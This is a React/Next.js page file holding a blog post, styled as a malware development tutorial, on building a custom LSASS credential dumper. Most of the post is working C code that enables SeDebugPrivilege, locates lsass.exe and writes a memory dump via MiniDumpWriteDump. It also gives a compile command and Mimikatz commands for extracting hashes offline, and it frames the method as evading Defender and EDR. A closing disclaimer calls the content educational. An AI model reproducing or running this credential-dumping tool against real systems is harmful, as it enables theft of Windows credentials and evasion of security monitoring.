"use client";

import PageLayout from "@/components/PageLayout";
import { motion } from "framer-motion";
import { ArrowLeft, Code, Shield, Cpu, FileCode, Bug, Terminal, AlertTriangle, Key, Database, Lock } from "lucide-react";
import Link from "next/link";
import Image from "next/image";
import { isPostComingSoon } from "@/lib/blogUtils";
import { useEffect } from "react";
import { useRouter } from "next/navigation";

// Optional: Table of Contents component (remove if not needed)
const TableOfContents = () => (
  <div className="hidden lg:block p-4 lg:p-6 bg-background/50 border border-border rounded-lg sticky top-24">
    <h2 className="text-base lg:text-lg font-light mb-4 text-foreground">Table of Contents</h2>
    <ul className="space-y-2 text-foreground/70 font-light text-xs lg:text-sm">
      <li><a href="#why-custom" className="hover:text-foreground transition-colors">1. Why Build Custom LSASS Dumpers?</a></li>
      <li><a href="#lsass-pastime" className="hover:text-foreground transition-colors">2. Why LSASS Dumping is Our Favorite Pastime</a></li>
      <li><a href="#secret-weapon" className="hover:text-foreground transition-colors">3. Our Secret Weapon: MiniDumpWriteDump</a></li>
      <li><a href="#building-dumper" className="hover:text-foreground transition-colors">4. Building the Perfect LSASS Dumper</a></li>
      <li><a href="#practice" className="hover:text-foreground transition-colors">5. Putting It All into Practice</a></li>
      <li><a href="#wrap-up" className="hover:text-foreground transition-colors">6. Wrap-Up</a></li>
    </ul>
  </div>
);

// Section component for consistent styling
const Section = ({ id, title, children, icon: Icon }: { id: string, title: string, children: React.ReactNode, icon: React.ElementType }) => (
  <motion.section 
    id={id} 
    initial={{ opacity: 0, y: 20 }}
    whileInView={{ opacity: 1, y: 0 }}
    transition={{ duration: 0.5 }}
    viewport={{ once: true }}
    className="mb-12"
  >
    <div className="flex items-center mb-4">
      <Icon className="h-5 w-5 mr-3 text-foreground/60" />
      <h2 className="text-2xl md:text-3xl font-light tracking-tight text-foreground">{title}</h2>
    </div>
    <div className="text-foreground/80 font-light leading-relaxed break-words overflow-x-hidden max-w-full">
      {children}
    </div>
  </motion.section>
);

// CodeBlock component for code snippets
const CodeBlock = ({ code, language }: { code: string, language: string }) => (
  <div className="bg-black/80 border border-border rounded-lg p-3 sm:p-4 my-6 overflow-x-auto max-w-full">
    <div className="flex justify-between items-center mb-2">
      <span className="text-foreground/60 text-xs sm:text-sm font-mono">{language}</span>
    </div>
    <pre className="text-foreground/90 font-mono text-xs sm:text-sm leading-relaxed whitespace-pre-wrap break-words overflow-wrap-anywhere word-break-break-all max-w-full">
      <code className="break-words break-all">{code}</code>
    </pre>
  </div>
);

export default function BlogPost() {
  const router = useRouter();
  
  useEffect(() => {
    // Check if this post is marked as coming soon
    if (isPostComingSoon("/blog/custom-lsass-dumpers")) {
      router.push("/blog");
    }
  }, [router]);

  // If coming soon, don't render content (will redirect)
  if (isPostComingSoon("/blog/custom-lsass-dumpers")) {
    return null;
  }

  return (
    <PageLayout>
      <div className="container mx-auto px-4 sm:px-6 lg:px-8 py-12 overflow-x-hidden w-full">
        <div className="max-w-5xl mx-auto w-full">
          {/* Back button */}
          <Link 
            href="/blog" 
            className="inline-flex items-center text-foreground/70 hover:text-foreground transition-colors font-light text-sm mb-8"
          >
            <ArrowLeft className="mr-2 h-4 w-4" /> Back to yaps
          </Link>

          {/* Header */}
          <header className="text-center mb-12">
            <motion.h1
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5 }}
              className="text-3xl sm:text-4xl md:text-5xl font-extralight tracking-tight mb-6 text-foreground break-words"
            >
              Beyond Mimikatz: The Art of Developing Custom LSASS Dumpers
            </motion.h1>
            <motion.div
              initial={{ opacity: 0, y: 20 }}
              animate={{ opacity: 1, y: 0 }}
              transition={{ duration: 0.5, delay: 0.1 }}
              className="text-sm text-foreground/60 font-light"
            >
              <span>September 19, 2025</span>
              <span className="mx-2">•</span>
              <span>5 min read</span>
            </motion.div>
          </header>

          

          {/* Optional: Featured Image */}
          <div className="relative w-full max-w-full aspect-[16/8] rounded-lg overflow-hidden my-12 border border-border">
            <Image
              src="https://images.unsplash.com/photo-1593012542172-05ecc3bd64ab?ixlib=rb-4.1.0&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&q=80&w=1160"
              alt="Custom LSASS Dumpers - Beyond Mimikatz"
              fill
              className="object-cover"
              sizes="100vw"
            />
          </div>

          {/* Content Grid */}
          <div className="grid lg:grid-cols-4 gap-6 lg:gap-12 w-full max-w-full">
            <div className="lg:col-span-3 w-full max-w-full overflow-x-hidden">
              
              {/* Why Custom */}
              <Section id="why-custom" title="Why Build Custom LSASS Dumpers?" icon={Terminal}>
                <p className="mb-4 break-words">
                  Welcome to another malware dev article, nerds. 🦉
                </p>
                <p className="mb-4 break-words">
                  Tired of your shiny new Mimikatz binary getting deleted by Windows Defender before you can even press Enter? Welcome to the club. As security products get better at spotting and stopping old, reliable tools, we have to get creative. The name of the game is evasion, and today, we're going old school by going new school by building our own LSASS dumper from scratch.
                </p>
                <p className="mb-4 break-words">
                  The Local Security Authority Server Service (LSASS) is a juicy target. Think of it as the brain of Windows authentication. It holds the user credentials we want in a format we can parse. Mimikatz is the legendary tool for this, but its signature is a big red flag for modern EDRs and antivirus solutions.
                </p>
                <p className="font-medium text-foreground break-words">
                  So, let's learn how to make our own, leveraging a legitimate Windows function that's less likely to raise alarms.
                </p>
              </Section>

              {/* LSASS Pastime */}
              <Section id="lsass-pastime" title="Why LSASS Dumping is Our Favorite Pastime" icon={Key}>
                <p className="mb-4 break-words">
                  Modern Windows systems don't store plaintext passwords. They use cryptographic hashes specifically, the NTLM hash. But here's the thing: because LSASS needs these hashes for authentication, they have to be hanging out in its memory. By taking a memory snapshot (a "dump") of the LSASS process, we can swipe these hashes and use them offline.
                </p>
                <p className="font-medium text-foreground break-words">
                  It's like finding the master key to the castle, conveniently left in the guard's pocket.
                </p>
              </Section>

              {/* Secret Weapon */}
              <Section id="secret-weapon" title="Our Secret Weapon: MiniDumpWriteDump" icon={Shield}>
                <p className="mb-4 break-words">
                  Our main tool is a legitimate Windows API function called MiniDumpWriteDump. It was designed for developers to debug applications by creating a snapshot of an application's state. But we're not developers, are we? We're malware developers, and we see an opportunity.
                </p>
                <p className="mb-4 break-words">
                  The function prototype is as follows:
                </p>

                <CodeBlock 
                  code={`BOOL MiniDumpWriteDump(
  [in] HANDLE                      hProcess,
  [in] DWORD                       ProcessId,
  [in] HANDLE                      hFile,
  [in] MINIDUMP_TYPE               DumpType,
  [in] PMINIDUMP_EXCEPTION_INFORMATION   ExceptionParam,
  [in] PMINIDUMP_USER_STREAM_INFORMATION UserStreamParam,
  [in] PMINIDUMP_CALLBACK_INFORMATION    CallbackParam
);`}
                  language="c"
                />

                <p className="mb-4 break-words">
                  The plan is simple: acquire a handle to lsass.exe, create an output file for the collected data, and call the API.
                </p>
              </Section>

              {/* Building Dumper */}
              <Section id="building-dumper" title="Building the Perfect LSASS Dumper" icon={Code}>
                
                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">1. Finding Our Target (lsass.exe)</h3>
                <p className="mb-4 break-words">
                  First, we need to find the Process ID (PID) of lsass.exe. We do this by taking a snapshot of all running processes and filtering for our favorite one.
                </p>

                <CodeBlock 
                  code={`#include <stdio.h>
#include <windows.h>
#include <strings.h>
#include <stdlib.h>
#include <tlhelp32.h>

int findTargetProcess(char * processName){
  int processID = 0;
  HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
  if(INVALID_HANDLE_VALUE == processSnapshot) return 0;

  PROCESSENTRY32  procEntry;

  BOOL result = Process32First(processSnapshot,&procEntry);

  // retrieving information

  while(result){

    // if process found, return the PID
    if(strcmp(processName,procEntry.szExeFile)==0){
      processID = procEntry.th32ProcessID;
      break;
    }
    result = Process32Next(processSnapshot, &procEntry);
  }
  CloseHandle(processSnapshot);
  return processID;
}

int main(int argc, char* argv[]){
  int pid; 

  pid = findTargetProcess(argv[1]);
  if(pid){
    printf("pid =%d\\n", pid);
  }
  return 0;
}`}
                  language="c"
                />

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">2. Giving Ourselves a Free Pass (SeDebugPrivilege)</h3>
                <p className="mb-4 break-words">
                  By default, we can't just reach into the memory of a highly privileged process like LSASS. We need to elevate our own process's privileges by enabling SeDebugPrivilege. This is a classic move that grants us the right to debug and manipulate other processes.
                </p>

                <CodeBlock 
                  code={`#include <stdio.h>
#include <windows.h>
#include <strings.h>
#include <stdlib.h>
#include <tlhelp32.h>

int findTargetProcess(char * processName){
    int processID = 0;
    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(INVALID_HANDLE_VALUE == processSnapshot) return 0;

    PROCESSENTRY32 procEntry;

    BOOL result = Process32First(processSnapshot,&procEntry);

    // retrieving information

    while(result){

      // if process found, return the PID
      if(strcmp(processName,procEntry.szExeFile)==0){
        processID = procEntry.th32ProcessID;
        break;
      }
      result = Process32Next(processSnapshot, &procEntry);
    }
    CloseHandle(processSnapshot);
    return processID;
}

// enabling DEBUG privilege

BOOL enablePrivilege(LPCTSTR privilegeName){
    HANDLE processToken;
    TOKEN_PRIVILEGES tp;
    LUID privilegeLUID;
    BOOL result = TRUE;

    if(!LookupPrivilegeValue(NULL,privilegeName,&privilegeLUID)) result = FALSE;
        
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = privilegeLUID;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&processToken)) result == FALSE;
    if(!AdjustTokenPrivileges(processToken,FALSE,&tp,sizeof(TOKEN_PRIVILEGES),(PTOKEN_PRIVILEGES)NULL,(PDWORD)NULL)) result = FALSE;
    printf(result ? "successfully enabled %s\\n" : "failed to enable %s\\n", privilegeName);
}

int main(int argc, char* argv[]){
    if(!enablePrivilege(SE_DEBUG_NAME)) return -1;
    return 0;
}`}
                  language="c"
                />

                <p className="mb-4 break-words">
                  Call it with: setPrivilege(SE_DEBUG_NAME);
                </p>

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">3. Wrapping Up: Our MiniDump Function</h3>
                <p className="mb-4 break-words">
                  Now we put it all together. We get our debug privilege, find the LSASS PID, open a handle to the process with the right permissions (PROCESS_VM_READ), create our dump file, and then call the MiniDumpWriteDump function.
                </p>

                <CodeBlock 
                  code={`#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <dbghelp.h>
#pragma comment (lib, "dbghelp.lib")

int findTargetProcess(char * processName){
    int processID = 0;
    HANDLE processSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);
    if(INVALID_HANDLE_VALUE == processSnapshot) return 0;

    PROCESSENTRY32  procEntry;

    BOOL result = Process32First(processSnapshot,&procEntry);

    // Retrieving process information
    while(result){

      // If process is found, return the PID
      if(strcmp(processName,procEntry.szExeFile)==0){
        processID = procEntry.th32ProcessID;
        break;
      }
      result = Process32Next(processSnapshot, &procEntry);
    }
    CloseHandle(processSnapshot);
    return processID;

}

// Enabling DEBUG PRIVILEGE
BOOL enablePrivilege(LPCTSTR privilegeName){
    HANDLE processToken;
    TOKEN_PRIVILEGES tp;
    LUID privilegeLUID;
    BOOL result = TRUE;

    if(!LookupPrivilegeValue(NULL,privilegeName,&privilegeLUID)) result = FALSE;
        
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = privilegeLUID;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES,&processToken)) result == FALSE;
    if(!AdjustTokenPrivileges(processToken,FALSE,&tp,sizeof(TOKEN_PRIVILEGES),(PTOKEN_PRIVILEGES)NULL,(PDWORD)NULL)) result = FALSE;
    printf(result? "Successfully enabled %s\\n":"Failed to enable %s\\n",privilegeName);

 return result;
    
}

// Generating dump
BOOL generateMiniDump() {
    bool dumpSuccess = FALSE;
    int processID = findTargetProcess("lsass.exe");
    HANDLE processHandle = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, 0, processID);
    HANDLE outputHandle = CreateFile((LPCTSTR)"C:\\\\Users\\\\vboxuser\\\\Downloads\\\\lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (processHandle && outputHandle != INVALID_HANDLE_VALUE) {
        dumpSuccess = MiniDumpWriteDump(processHandle, processID, outputHandle, (MINIDUMP_TYPE)0x00000002, NULL, NULL, NULL);
        printf(dumpSuccess ? "Successfully dumped to lsass.dmp :)\\n" : "Failed to dump :(\\n");
    } 
    return dumpSuccess; 
}

int main(int argc, char* argv[]){
    if(!enablePrivilege(SE_DEBUG_NAME)) return -1;
    if(!generateMiniDump()) return -1;
    return 0;
}`}
                  language="c"
                />
              </Section>

              {/* Practice */}
              <Section id="practice" title="Putting It All into Practice" icon={Database}>
                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">1. Compile</h3>
                <p className="mb-4 break-words">
                  Use a cross-compiler like Mingw-w64 on Linux to create your executable.
                </p>

                <CodeBlock 
                  code={`x86_64-w64-mingw32-g++ -O2 "fileName.c" -o "fileName.exe" -I/usr/share/mingww64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive -ldbghelp`}
                  language="bash"
                />

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">2. Execute</h3>
                <p className="mb-4 break-words">
                  Transfer your miniDump.exe to the target machine and run it. The lsass.dmp file will be created in C:\Users\vboxuser\Downloads.
                </p>

                <h3 className="text-lg sm:text-xl font-light mt-6 mb-3 text-foreground break-words">3. Exfiltrate & Parse</h3>
                <p className="mb-4 break-words">
                  Copy the dump file back to your attacker machine. You can now use Mimikatz on the dump file offline, without the target's security products freaking out.
                </p>

                <CodeBlock 
                  code={`mimikatz # sekurlsa::minidump C:\\Users\\vboxuser\\Downloads\\lsass.dmp
mimikatz # sekurlsa::logonpasswords`}
                  language="bash"
                />

                <div className="relative w-full max-w-full my-6 rounded-lg overflow-hidden border border-border">
                  <Image
                    src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*BAQoMA15q3CbLaZwvh3fFQ.png"
                    alt="Mimikatz parsing LSASS dump results"
                    width={1200}
                    height={600}
                    className="w-full h-auto rounded-lg object-contain max-w-full"
                    sizes="100vw"
                  />
                </div>

                <div className="relative w-full max-w-full my-6 rounded-lg overflow-hidden border border-border">
                  <Image
                    src="https://miro.medium.com/v2/resize:fit:720/format:webp/1*XyDUnHjLFhY7K9AFhcWxxQ.png"
                    alt="Hashcat output showing cracked hashes"
                    width={1200}
                    height={600}
                    className="w-full h-auto rounded-lg object-contain max-w-full"
                    sizes="100vw"
                  />
                </div>
              </Section>

              {/* Wrap Up */}
              <Section id="wrap-up" title="Wrap-Up" icon={Lock}>
                <p className="mb-4 break-words">
                  This is what we call "living off the land," using the target's own tools and functions against them. While they're building bigger walls, we're just picking the lock with a key they gave us.
                </p>
                <p className="mb-4 break-words">
                  Custom LSASS dumpers demonstrate the power of understanding Windows internals and leveraging legitimate APIs for security testing. By building our own tools, we bypass signature-based detection and gain deeper insights into how these techniques actually work under the hood.
                </p>
                <p className="font-medium text-foreground break-words">
                  Now, get back to coding. They're not going to exploit themselves. ✌️
                </p>
              </Section>
            </div>
            
            {/* Optional: Sidebar with Table of Contents */}
            <aside className="lg:col-span-1 hidden lg:block">
              <TableOfContents />
            </aside>
          </div>

          {/* Footer */}
          <div className="mt-12 text-center">
            {/* Tags */}
            <div className="flex flex-wrap gap-2 justify-center mb-8">
              {['LSASS Dumping', 'Windows Security', 'Malware Development', 'Mimikatz', 'Credential Access', 'Living Off The Land', 'MiniDumpWriteDump'].map(tag => (
                <span key={tag} className="px-3 py-1 bg-background/50 border border-border rounded-full text-xs font-light text-foreground/70">
                  {tag}
                </span>
              ))}
            </div>

            {/* Legal Disclaimer */}
            <div className="bg-background/50 border border-border p-4 sm:p-6 rounded-lg my-8 max-w-2xl mx-auto">
              <h3 className="text-lg sm:text-xl font-light mb-3 text-foreground break-words">Legal & Ethical Notice</h3>
              <p className="text-foreground/80 font-light leading-relaxed break-words">
                This educational content demonstrates security concepts for defensive purposes. Always obtain proper authorization before testing these techniques. Unauthorized access to computer systems is illegal.
              </p>
            </div>

            {/* Back to yaps link */}
            <Link 
              href="/blog" 
              className="inline-flex items-center text-foreground/70 hover:text-foreground transition-colors font-light text-sm border border-border px-4 py-2 rounded hover:border-foreground/30"
            >
              More Yaps
            </Link>
          </div>
        </div>
      </div>
    </PageLayout>
  );
}